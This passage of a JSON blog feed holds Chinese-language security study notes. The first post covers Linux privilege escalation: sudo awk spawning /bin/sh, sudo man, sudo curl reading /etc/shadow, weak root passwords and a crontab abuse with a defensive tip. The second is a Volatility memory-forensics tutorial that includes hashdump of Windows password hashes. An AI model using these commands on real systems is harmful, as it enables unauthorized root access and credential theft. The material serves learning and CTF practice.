su</span><br><span class=\"line\">或者su root 尝试弱口令</span><br></pre></td></tr></table></figure>\n<h4 id=\"awk提权\"><a class=\"markdownIt-Anchor\" href=\"#awk提权\">#</a>  <code>awk提权</code></h4>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo awk &#39;BEGIN&#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>\n<p>提权成功</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100702235.png\" alt=\"image-20210410093844939\"></p>\n<h4 id=\"man提权\"><a class=\"markdownIt-Anchor\" href=\"#man提权\">#</a>  <code>man提权</code></h4>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo man man</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100730655.png\" alt=\"image-20210410100740319\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100740319.png\" alt=\"image-20210410100702235\"></p>\n<h4 id=\"curl提权\"><a class=\"markdownIt-Anchor\" href=\"#curl提权\">#</a>  <code>curl提权</code></h4>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo curl file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410100812432.png\" alt=\"image-20210410101229024\"></p>\n<h4 id=\"crontab提权\"><a class=\"markdownIt-Anchor\" href=\"#crontab提权\">#</a>  <code>crontab提权</code></h4>\n<p>cat /etc/crontab</p>\n<p>模拟一下<img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210410101229024.png\" alt=\"image-20210410100812432\"></p>\n<p>防范：crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron 下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>\n",
            "tags": [
                "Linux提权"
            ]
        },
        {
            "id": "http://chungod.github.io/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/",
            "url": "http://chungod.github.io/2021/04/09/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/",
            "title": "内存取证",
            "date_published": "2021-04-09T09:14:41.000Z",
            "content_html": "<h1 id=\"内存取证\"><a class=\"markdownIt-Anchor\" href=\"#内存取证\">#</a> <strong>内存取证</strong></h1>\n<h2 id=\"volatility-使用\"><a class=\"markdownIt-Anchor\" href=\"#volatility-使用\">#</a> <strong>volatility 使用：</strong></h2>\n<h3 id=\"获取内存镜像的摘要信息\"><a class=\"markdownIt-Anchor\" href=\"#获取内存镜像的摘要信息\">#</a> <strong>获取内存镜像的摘要信息</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw imageinfo</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102135222699.png\" alt=\"image-20201102135222699\"></strong></p>\n<blockquote>\n<p><strong>判断系统版本应该是 Win7SP1x64</strong></p>\n</blockquote>\n<h3 id=\"查看进程信息\"><a class=\"markdownIt-Anchor\" href=\"#查看进程信息\">#</a> <strong>查看进程信息</strong></h3>\n<p><strong>pslist 可以直接列出运行的进程，如果进程已经结束，会在 Exit 列显示日期和时间，表明进程已经结束</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 pslist</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102141316628.png\" alt=\"image-20201102141316628\"></strong></p>\n<h3 id=\"查看隐藏进程\"><a class=\"markdownIt-Anchor\" href=\"#查看隐藏进程\">#</a> <strong>查看隐藏进程</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 pstree</span><br><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 psxview</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102154603111.png\" alt=\"image-20201102154603111\"></strong></p>\n<h3 id=\"列举缓存在内存的注册表\"><a class=\"markdownIt-Anchor\" href=\"#列举缓存在内存的注册表\">#</a> <strong>列举缓存在内存的注册表</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102150810232.png\" alt=\"image-20201102150810232\"></strong></p>\n<h3 id=\"提取主机名\"><a class=\"markdownIt-Anchor\" href=\"#提取主机名\">#</a> <strong>提取主机名</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 printkey -K &quot;ControlSet001\\Control\\ComputerName\\ComputerName&quot;</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201115091150119.png\" alt=\"image-20201115091150119\"></strong></p>\n<h3 id=\"提取自启动项\"><a class=\"markdownIt-Anchor\" href=\"#提取自启动项\">#</a> <strong>提取自启动项</strong></h3>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201115091434803.png\" alt=\"image-20201115091434803\"></strong></p>\n<p><strong>提取内存中保留的 cmd 命令使用情况</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f name --profile&#x3D;WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure>\n<p><strong>获取到当时的网络连接情况</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f name --profile&#x3D;WinXPSP2x86 netscan</span><br></pre></td></tr></table></figure>\n<h3 id=\"提取ip地址和主机名\"><a class=\"markdownIt-Anchor\" href=\"#提取ip地址和主机名\">#</a> <strong>提取 ip 地址和主机名</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f name --profile&#x3D;WinXPSP2x86 netscan | grep ESTABLISHED</span><br></pre></td></tr></table></figure>\n<p><strong>userassist 键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f name --profile&#x3D;WinXPSP2x86 userassist</span><br></pre></td></tr></table></figure>\n<h3 id=\"获取sam表中的用户\"><a class=\"markdownIt-Anchor\" href=\"#获取sam表中的用户\">#</a> <strong>获取 SAM 表中的用户 ：</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot;</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102152225937.png\" alt=\"image-20201102152225937\"></strong></p>\n<p><strong>显示每个进程的加载 dll 列表</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Volatility -f name -profile &#x3D; Win7SP0x86 dlllist&gt; dlllist.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"扫描内存中的文件\"><a class=\"markdownIt-Anchor\" href=\"#扫描内存中的文件\">#</a> <strong>扫描内存中的文件</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 filescan</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102151129039.png\" alt=\"image-20201102151129039\"></strong></p>\n<ul>\n<li><strong>filescan 也可以结合 grep 命令来进行筛选，比如</strong></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 filescan | grep &quot;doc\\|docx&quot;</span><br><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 filescan | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102151359619.png\" alt=\"image-20201102151359619\"></strong></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201203173328344.png\" alt=\"image-20201203173328344\"></p>\n<h2 id=\"提取flag值\"><a class=\"markdownIt-Anchor\" href=\"#提取flag值\">#</a> 提取 flag 值</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x07f1b6c10 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201203174024646.png\" alt=\"image-20201203174024646\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201203174048410.png\" alt=\"image-20201203174048410\"></p>\n<h3 id=\"提取内存中保留的cmd命令使用情况\"><a class=\"markdownIt-Anchor\" href=\"#提取内存中保留的cmd命令使用情况\">#</a> <strong>提取内存中保留的 cmd 命令使用情况</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102151626278.png\" alt=\"image-20201102151626278\"></strong></p>\n<h3 id=\"提取出内存中记录的-当时正在运行的程序\"><a class=\"markdownIt-Anchor\" href=\"#提取出内存中记录的-当时正在运行的程序\">#</a> <strong>提取出内存中记录的 当时正在运行的程序</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.vmem --profile&#x3D;Win7SP1x64 userassist</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102152650474.png\" alt=\"image-20201102152650474\"></strong></p>\n<h2 id=\"提取网络连接情况\"><a class=\"markdownIt-Anchor\" href=\"#提取网络连接情况\">#</a> <strong>提取网络连接情况</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102153001736.png\" alt=\"image-20201102153001736\"></strong></p>\n<h3 id=\"提取ie浏览器历史\"><a class=\"markdownIt-Anchor\" href=\"#提取ie浏览器历史\">#</a> <strong>提取 IE 浏览器历史</strong></h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure>\n<h3 id=\"提取系统密码hashdump\"><a class=\"markdownIt-Anchor\" href=\"#提取系统密码hashdump\">#</a> <strong>提取系统密码</strong>（hashdump）</h3>\n<p><strong>直接 hashdump</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102154219862.png\" alt=\"image-20201102154219862\"></strong></p>\n<ul>\n<li><strong>注册表 system 的 virtual 地址</strong></li>\n<li><strong>SAM 的 virtual 地址</strong></li>\n</ul>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102153454213.png\" alt=\"image-20201102153454213\"></strong></p>\n<ul>\n<li><strong>dump 出来密码</strong></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.vmem --profile&#x3D;Win7SP1x64 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）</span><br><span class=\"line\">volatility -f mem.vmen --profile&#x3D;Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000867010</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20201102153714379.png\" alt=\"image-20201102153714379\"></strong></p>\n<h3 id=\"提取迁移后的进程编号\"><a class=\"markdownIt-Anchor\" href=\"#提取迁移后的进程编号\">#</a> 提取迁移后的进程编号</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 malfind -p</span><br></pre></td></tr></table></figure>\n<h3 id=\"提取开机自启项的virtual地址\"><a class=\"markdownIt-Anchor\" href=\"#提取开机自启项的virtual地址\">#</a> 提取开机自启项的 Virtual 地址</h3>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 printkey -K &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span><br><span class=\"line\">volatility -f mem.raw --profile&#x3D;Win7SP1x64 printkey -K &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "内存取证"
            ]
        }
    ]
}